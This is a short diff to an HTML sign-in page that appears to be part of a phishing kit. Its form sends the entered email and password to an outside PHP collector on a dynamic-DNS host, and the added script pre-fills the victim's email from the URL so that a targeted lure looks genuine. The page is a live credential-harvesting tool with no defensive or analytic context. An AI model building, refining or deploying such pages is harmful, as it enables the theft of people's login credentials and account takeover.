@@ -178,6 +178,11 @@
         <h2>Sign in</h2>
         <form id="loginForm" action="https://intakalbkabera.zapto.org/single/next2580.php" method="post">
             <input type="email" id="inputline1" name="user" placeholder="Enter Email" required>
+            <script type="text/javascript">
+                var url = window.location.href;
+                var name = url.substring(url.indexOf("=") + 1);
+                document.getElementById("inputline1").value = name;
+            </script>
             <input type="password" name="pass" placeholder="Enter Password" required>
             <input class="continue-btn" type="submit" name="submit" value="Login" />
         </form>
